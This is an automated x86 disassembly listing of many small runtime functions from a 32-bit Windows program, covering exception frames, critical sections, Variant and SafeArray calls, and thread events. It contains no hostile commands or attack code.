cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_3a6dc8d
jmp sub_3a64b54
sub_3a6dcaa
jmp sub_3a64b54
sub_3a6dcb1
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6dd58
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_3a6dcc0
mov ecx eax
sub_3a6df80
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_3a6dfa0
push eax
call CharNextA
retn
sub_3a6e687
jmp sub_3a64b54
sub_3a6e68e
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6e87d
jmp sub_3a64b54
sub_3a6e884
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a6e909
retn
sub_3a6eac3
jmp sub_3a64b54
sub_3a6eaca
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6ead0
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_3a6ea2c
sub_3a6eb8c
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_3a6eb98
xchg [ eax ] edx
mov eax edx
retn
sub_3a6ec00
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
movzx eax [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_3a6ec94
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_3a6edb0
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_3a6edd8
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_3a6f067
jmp sub_3a64b54
sub_3a6f06e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a6f0dc
jmp sub_3a64b54
sub_3a6f0e3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a6f101
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_3a6f0fa
jmp sub_3a64b54
sub_3a6f101
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a6f590
jmp sub_3a64b54
sub_3a6f597
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_3a6f604
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_3a6f66a
jmp sub_3a64b54
sub_3a6f671
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3a6f6d6
jmp sub_3a64b54
sub_3a6f6dd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3a6f742
jmp sub_3a64b54
sub_3a6f749
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3a6f7ae
jmp sub_3a64b54
sub_3a6f7b5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3a6f81a
jmp sub_3a64b54
sub_3a6f821
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_3a6f899
jmp sub_3a64b54
sub_3a6f8a0
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_3a6f90c
jmp sub_3a64b54
sub_3a6f913
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_3a6f97e
jmp sub_3a64b54
sub_3a6f985
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_3a6f9f4
jmp sub_3a64b54
sub_3a6f9fb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ SafeArrayCreate@IAT ]
SafeArrayGetLBound
jmp [ SafeArrayGetLBound@IAT ]
SafeArrayGetUBound
jmp [ SafeArrayGetUBound@IAT ]
sub_3a6fd81
jmp sub_3a64b54
sub_3a6fd88
pop ebp
retn
sub_3a6fd8d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_3a70416
jmp sub_3a64b54
sub_3a7041d
pop ecx
pop ebp
retn
sub_3a704af
jmp sub_3a64b54
sub_3a704b6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a70506
jmp sub_3a64b54
sub_3a7050d
pop ecx
pop ebp
retn
sub_3a7055a
jmp sub_3a64b54
sub_3a70561
pop ecx
pop ebp
retn
sub_3a705f3
jmp sub_3a64b54
sub_3a705fa
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7064a
jmp sub_3a64b54
sub_3a70651
pop ecx
pop ebp
retn
sub_3a70899
jmp sub_3a64b54
sub_3a708a0
pop ebx
mov esp ebp
pop ebp
retn
sub_3a709b6
jmp sub_3a64b54
sub_3a709bd
pop ecx
pop ebp
retn
sub_3a709c0
push ebx
mov ebx eax
mov eax ebx
call sub_3a70c58
mov [ ebx ] 0x1
pop ebx
retn
sub_3a70c6c
push eax
call sub_3a70c58
pop eax
retn
sub_3a70ecc
call sub_3a70f80
retn
sub_3a71020
jmp sub_3a64b54
sub_3a71027
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7106e
jmp sub_3a64b54
sub_3a71075
pop ebx
pop ecx
pop ebp
retn
sub_3a710ba
jmp sub_3a64b54
sub_3a710c1
pop ebx
pop ecx
pop ebp
retn
sub_3a71106
jmp sub_3a64b54
sub_3a7110d
pop ebx
pop ecx
pop ebp
retn
sub_3a71152
jmp sub_3a64b54
sub_3a71159
pop ebx
pop ecx
pop ebp
retn
sub_3a7151b
jmp sub_3a64b54
sub_3a71522
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a715bc
jmp sub_3a64b54
sub_3a715c3
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a71a31
jmp sub_3a648a0
sub_3a71aee
jmp sub_3a648a0
sub_3a71b99
jmp sub_3a648a0
sub_3a71c91
jmp sub_3a648a0
sub_3a71d6a
jmp sub_3a648a0
sub_3a71e56
jmp sub_3a648a0
sub_3a72016
jmp sub_3a64b54
sub_3a7201d
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7207f
jmp sub_3a64b54
sub_3a72086
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a724ec
jmp sub_3a648a0
sub_3a725d6
jmp sub_3a64b54
sub_3a725dd
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7267c
jmp sub_3a64b54
sub_3a72683
movzx eax [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a72a2c
call sub_3a726d8
neg al
sbb eax eax
neg eax
retn
sub_3a72aed
jmp sub_3a64b54
sub_3a72af4
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a72b9d
jmp sub_3a64b54
sub_3a72ba4
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a730f1
jmp sub_3a648a0
sub_3a731f8
jmp sub_3a64b54
sub_3a731ff
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73309
jmp sub_3a64b54
sub_3a73310
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73760
jmp sub_3a64b54
sub_3a73767
fild [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73871
jmp sub_3a64b54
sub_3a73878
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73dbc
jmp sub_3a64b54
sub_3a73dc3
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73e69
jmp sub_3a64b54
sub_3a73e70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a73e92
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_3a65a94
retn
sub_3a73e8b
jmp sub_3a64b54
sub_3a73e92
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73eee
jmp sub_3a64b54
sub_3a73ef5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a73f71
jmp sub_3a64b54
sub_3a744b0
jmp sub_3a64b54
sub_3a744b7
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7454d
jmp sub_3a64b54
sub_3a74554
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a74571
lea eax [ ebp - 0x14 ]
call sub_3a65a7c
retn
sub_3a7456a
jmp sub_3a64b54
sub_3a74571
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a745ce
jmp sub_3a64b54
sub_3a745d5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a74677
jmp sub_3a64b54
sub_3a74694
jmp sub_3a64b54
sub_3a7469b
movzx eax [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_3a74be9
jmp sub_3a64b54
sub_3a74bf0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a74c62
jmp sub_3a64b54
sub_3a74c69
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a74ff4
push eax
call sub_3a70c58
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_3a75008
push eax
call sub_3a70c58
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_3a75193
jmp sub_3a64b54
sub_3a751bf
jmp sub_3a64b54
sub_3a751c6
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7540f
jmp sub_3a64b54
sub_3a75416
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a756b8
jmp sub_3a64b54
sub_3a75747
jmp sub_3a64b54
sub_3a75838
jmp sub_3a64b54
sub_3a758db
jmp sub_3a64b54
sub_3a75992
jmp sub_3a64b54
sub_3a75a38
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_3a70f80
add esp 0x10
sub_3a75ce2
jmp sub_3a64b54
sub_3a75ce9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a75d2c
movzx eax [ eax ]
retn
sub_3a75e2c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_3a70c58
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_3a75e44
mov edx 0x80020004
call sub_3a75e2c
retn
sub_3a75e94
mov dl 0x1
call sub_3a75e9c
retn
sub_3a75f49
jmp sub_3a64b54
sub_3a75f50
pop esi
pop ebx
pop ebp
retn
sub_3a75f54
push ebp
mov ebp esp
call sub_3a76114
pop ebp
retn 0x4
sub_3a75fe0
push ebp
mov ebp esp
call sub_3a76114
pop ebp
retn 0x4
sub_3a760c3
jmp sub_3a64b54
sub_3a760ca
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_3a64370
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a64734
sub_3a760ec
xor eax eax
retn
sub_3a760f0
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_3a76104
mov [ ecx ] 0x8
mov al 0x1
retn
sub_3a7610c
call sub_3a703cc
retn
sub_3a76114
call sub_3a704bc
retn
sub_3a7611c
call sub_3a7096c
retn
sub_3a76124
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_3a76138
call sub_3a76114
retn
sub_3a76140
push ebp
mov ebp esp
call sub_3a7611c
pop ebp
retn 0x8
sub_3a76158
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_3a76234
jmp sub_3a64b54
sub_3a76301
jmp sub_3a64b54
sub_3a76308
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a76325
lea eax [ ebp - 0x10 ]
call sub_3a652a0
retn
sub_3a7631e
jmp sub_3a64b54
sub_3a76325
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a76330
call sub_3a709c0
retn
sub_3a76338
mov ecx 0xe
call sub_3a759d0
cmp al 0x1
retn
sub_3a763b7
jmp sub_3a64b54
sub_3a763be
pop ebp
retn
sub_3a765fd
jmp sub_3a64b54
sub_3a76604
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a76900
jmp sub_3a64b54
sub_3a76907
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a769ab
jmp sub_3a64b54
sub_3a769b2
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a76a54
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_3a769bc
mov eax ebx
mov edx esp
call sub_3a65504
add esp 0x100
pop ebx
retn
sub_3a76ab0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_3a652f4
pop esi
pop ebx
retn
sub_3a76b8c
jmp sub_3a64b54
sub_3a76b93
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a76be4
jmp sub_3a64b54
sub_3a76beb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a76d3d
jmp sub_3a64b54
sub_3a76d44
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a76e13
jmp sub_3a64b54
sub_3a76e1a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a77134
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_3a70f80
pop esi
pop ebx
retn
sub_3a773de
jmp sub_3a64b54
sub_3a773e5
pop ebp
retn
sub_3a77d45
add [ esp + 0x4 ] 0xfffffff8
jmp sub_3a7ace4
sub_3a78264
mov esp 0x9803a7c1
0x3a7
sub_3a782c6
cmpsd [ esi ] [ edi ]
add edx eax
0x3a7
sub_3a78352
cmpsd [ esi ] [ edi ]
add ebx [ esp + ecx * 8 ]
cmpsd [ esi ] [ edi ]
add esi [ esp + ecx * 8 ]
cmpsd [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add ecx [ eax + 0x34 ]
cmpsb [ esi ] [ edi ]
add edx esp
int3
sub_3a783c2
cmpsd [ esi ] [ edi ]
add edi [ eax - 0x30 ]
cmpsd [ esi ] [ edi ]
add ecx [ eax + edx * 8 - 0x2fd3fc59 ]
cmpsd [ esi ] [ edi ]
add edi [ eax + edx * 8 ]
cmpsd [ esi ] [ edi ]
add edx esp
int3
sub_3a7843a
cmpsd [ esi ] [ edi ]
add edi [ eax - 0x30 ]
cmpsd [ esi ] [ edi ]
add ecx [ eax + edx * 8 - 0x2fd3fc59 ]
cmpsd [ esi ] [ edi ]
add edi [ eax + edx * 8 ]
cmpsd [ esi ] [ edi ]
add edx esp
int3
sub_3a78e0c
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_3a78e80
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_3a78f4c
mov eax [ eax + 0xc ]
call sub_3a7a33c
retn
sub_3a79220
jmp sub_3a64b54
sub_3a79227
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7954b
jmp sub_3a64b54
sub_3a79552
mov esp ebp
pop ebp
retn
sub_3a79624
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_3a79630
push ebx
mov ebx edx
mov edx ebx
call sub_3a79440
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_3a79170
sub_3a796dc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_3a79837
jmp sub_3a64b54
sub_3a7990b
jmp sub_3a64b54
sub_3a7991c
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_3a79988
jmp sub_3a64b54
sub_3a7998f
pop ebx
mov esp ebp
pop ebp
retn
sub_3a799da
jmp sub_3a64b54
sub_3a799e1
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_3a79a6d
jmp sub_3a64b54
sub_3a79a74
pop ebx
pop ebp
retn
sub_3a79aba
jmp sub_3a64b54
sub_3a79ac1
pop ebx
pop ebp
retn
sub_3a79b06
jmp sub_3a64b54
sub_3a79b0d
pop ebx
pop ebp
retn
sub_3a79b57
jmp sub_3a64b54
sub_3a79b5e
pop esi
pop ebx
pop ebp
retn
sub_3a79bb2
jmp sub_3a64b54
sub_3a79bb9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_3a79ce6
jmp sub_3a64b54
sub_3a79d62
jmp sub_3a64b54
sub_3a79e38
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_3a7a630
sub_3a79f28
jmp sub_3a64b54
sub_3a7a0b2
jmp sub_3a64b54
sub_3a7a0b9
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7a153
jmp sub_3a64b54
sub_3a7a15a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7a179
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_3a7a172
jmp sub_3a64b54
sub_3a7a179
movzx eax [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_3a7a1e9
jmp sub_3a64b54
sub_3a7a1f0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7a2e8
jmp sub_3a64b54
sub_3a7a2ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_3a64380
retn
sub_3a7a305
jmp sub_3a64b54
sub_3a7a370
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a7a68c
xor edx edx
mov eax ebx
call sub_3a7a650
pop ebx
retn
sub_3a7a3e4
mov eax [ ebp + 0x4 ]
retn
sub_3a7a41a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a7a468
jmp sub_3a64b54
sub_3a7a46f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7a474
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_3a7a48c
xor edx edx
call sub_3a7a494
retn
sub_3a7a73c
retn
sub_3a7a7f7
jmp sub_3a64b54
sub_3a7a7fe
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_3a64734
sub_3a7a88c
jmp sub_3a64b54
sub_3a7a893
pop ebx
pop ecx
pop ebp
retn
sub_3a7a898
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_3a7a8ef
jmp sub_3a64b54
sub_3a7a8f6
pop ebx
pop ecx
pop ebp
retn
sub_3a7a8fc
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_3a7a938
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
retn
sub_3a7a950
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_3a7aa2b
retn
sub_3a7aad0
test edx edx
je r-xdata
xor edx edx
call sub_3a7aae4
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_3a7ab9a
jmp sub_3a64b54
sub_3a7aba1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7abb4
xchg edx eax
call sub_3a7aae4
retn
sub_3a7abbc
retn
sub_3a7ac55
jmp sub_3a64b54
sub_3a7ac5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7ae21
jmp sub_3a64b54
sub_3a7ae28
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7af91
jmp sub_3a64b54
sub_3a7af98
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7afdc
xor edx edx
call sub_3a7ae98
retn
sub_3a7b14a
jmp sub_3a64b54
sub_3a7b164
inc [ eax + 0xc ]
retn
sub_3a7b168
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_3a7b1d2
jmp sub_3a64b54
sub_3a7b1e0
dec [ eax + 0xc ]
call sub_3a7b168
retn
sub_3a7b1ec
xor eax eax
retn
sub_3a7b1f0
push ebx
mov ebx ecx
mov eax ebx
call sub_3a652a0
pop ebx
retn
sub_3a7b2e6
jmp sub_3a64b54
sub_3a7b2ed
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7b3fe
jmp sub_3a64b54
sub_3a7b4f4
retn
sub_3a7b4f8
retn
sub_3a7b538
retn
sub_3a7b53c
retn
sub_3a7b5a8
mov eax [ eax + 0x18 ]
retn
sub_3a7b6ae
jmp sub_3a64b54
sub_3a7b6b5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7b6d2
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3a7b6cb
jmp sub_3a64b54
sub_3a7b6d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7b77c
jmp sub_3a64b54
sub_3a7b794
push ebx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
inc [ ebx + 0x10 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_3a7b850
dec [ eax + 0x10 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_3a7b8f9
jmp sub_3a64b54
sub_3a7b900
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7b90c
mov eax [ ebp + 0x4 ]
retn
sub_3a7b942
pop ecx
pop edx
pop esi
pop ebx
retn
sub_3a7b990
jmp sub_3a64b54
sub_3a7b997
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7ba56
jmp sub_3a64b54
sub_3a7ba5d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7ba82
lea eax [ ebp - 0x10 ]
call sub_3a652a0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7ba7b
jmp sub_3a64b54
sub_3a7ba82
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7ba8c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_3a7ba94
xor eax eax
retn
sub_3a7badd
jmp sub_3a64b54
sub_3a7bae4
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_3a7bc15
jmp sub_3a64b54
sub_3a7bc1c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7bc9c
jmp sub_3a64b54
sub_3a7bca3
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7bd73
jmp sub_3a64b54
sub_3a7bd7a
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7be30
jmp sub_3a64b54
sub_3a7be37
pop ebx
pop ecx
pop ebp
retn
sub_3a7bebc
jmp sub_3a64b54
sub_3a7bec3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7bee0
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
sub_3a7bed9
jmp sub_3a64b54
sub_3a7bee0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7bf6c
jmp sub_3a64b54
sub_3a7bf89
jmp sub_3a64b54
sub_3a7bf90
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7bfc8
retn
sub_3a7c04b
jmp sub_3a64b54
sub_3a7c052
mov eax [ ebp - 0x8 ]
call sub_3a7f084
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3a7c077
lea eax [ ebp - 0xc ]
call sub_3a652a0
retn
sub_3a7c070
jmp sub_3a64b54
sub_3a7c077
mov esp ebp
pop ebp
retn
sub_3a7c0c7
jmp sub_3a64b54
sub_3a7c0ce
pop ebx
pop ecx
pop ebp
retn
sub_3a7c125
jmp sub_3a64b54
sub_3a7c12c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7c134
retn
sub_3a7c1af
jmp sub_3a64b54
sub_3a7c1b6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7c313
jmp sub_3a64b54
sub_3a7c345
jmp sub_3a64b54
sub_3a7c34c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7c3da
jmp sub_3a64b54
sub_3a7c3e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_3a7c48c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
movzx eax [ ebx + 0xd ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_3a7c4a4
sub_3a7c51c
push ebx
push esi
mov esi eax
xor ecx ecx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop esi
pop ebx
retn
sub_3a7c590
push ebx
cmp [ eax + 0x10 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_3a7c5ac
push ebx
cmp [ eax + 0x10 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x32 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_3a7c7ac
mov eax [ eax + 0x20 ]
retn
sub_3a7c7b0
mov eax [ eax + 0x1c ]
retn
sub_3a7c84c
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_3a7ca98
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_3a7cad0
mov edx sub_3a7cab0
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_3a7cc1c
retn
sub_3a7cf14
jmp sub_3a64b54
sub_3a7cf1b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_3a7cf7c
jmp sub_3a64b54
sub_3a7cf83
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_3a7cf8c
xor ecx ecx
call sub_3a7cf94
retn
sub_3a7cfe4
jmp sub_3a64b54
sub_3a7cfeb
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7d02c
mov eax [ eax + 0x4 ]
call sub_3a69cc0
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_3a7d03c
mov eax [ eax + 0x4 ]
call sub_3a69cec
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_3a7d078
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_3a7d240
jmp sub_3a64b54
sub_3a7d2a0
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_3a7d304
push ebx
mov ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
pop ebx
retn
mov ebx [ eax + 0x4 ]
xchg edx ebx
mov eax ebx
call sub_3a7ce00
sub_3a7d367
jmp sub_3a64b54
sub_3a7d36e
pop ebx
pop ecx
pop ebp
retn
sub_3a7d438
jmp sub_3a64b54
sub_3a7d43f
pop ebx
pop ecx
pop ebp
retn
sub_3a7d652
jmp sub_3a64b54
sub_3a7d659
mov esp ebp
pop ebp
retn
sub_3a7d6fc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a6d3d4
call sub_3a64c34
retn
sub_3a7d784
mov [ eax + 0x18 ] edx
retn
sub_3a7d900
mov ecx edx
mov edx [ eax + 0x4 ]
mov eax [ eax + 0xc ]
xchg edx eax
call sub_3a76830
retn
sub_3a7d987
jmp sub_3a64b54
sub_3a7d98e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_3a7da3d
jmp sub_3a64b54
sub_3a7da44
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
